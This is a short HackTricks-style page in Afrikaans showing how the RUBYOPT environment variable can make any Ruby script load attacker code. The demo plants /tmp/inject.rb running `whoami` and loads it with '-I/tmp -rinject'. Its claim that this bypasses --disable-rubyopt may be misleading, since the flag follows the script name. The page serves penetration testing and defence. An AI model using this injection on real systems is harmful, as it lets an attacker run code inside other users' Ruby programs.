# macOS Ruby Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## RUBYOPT

Deur hierdie omgewing veranderlike te gebruik, is dit moontlik om **nuwe parameters** by **ruby** te voeg wanneer dit uitgevoer word. Alhoewel die parameter **`-e`** nie gebruik kan word om ruby kode aan te dui om uit te voer nie, is dit moontlik om die parameters **`-I`** en **`-r`** te gebruik om 'n nuwe gids by die biblioteke laai pad te voeg en dan **'n biblioteek aan te dui om te laai**.

Skep die biblioteek **`inject.rb`** in **`/tmp`**:
```ruby:inject.rb
puts `whoami`
```
Skep enige plek 'n ruby-skrip soos:
```ruby:hello.rb
puts 'Hello, World!'
```
Dan maak 'n arbitrêre ruby-skrip dit laai met:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```
Interessante feit, dit werk selfs met die param **`--disable-rubyopt`**:
```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```
{{#include ../../../banners/hacktricks-training.md}}
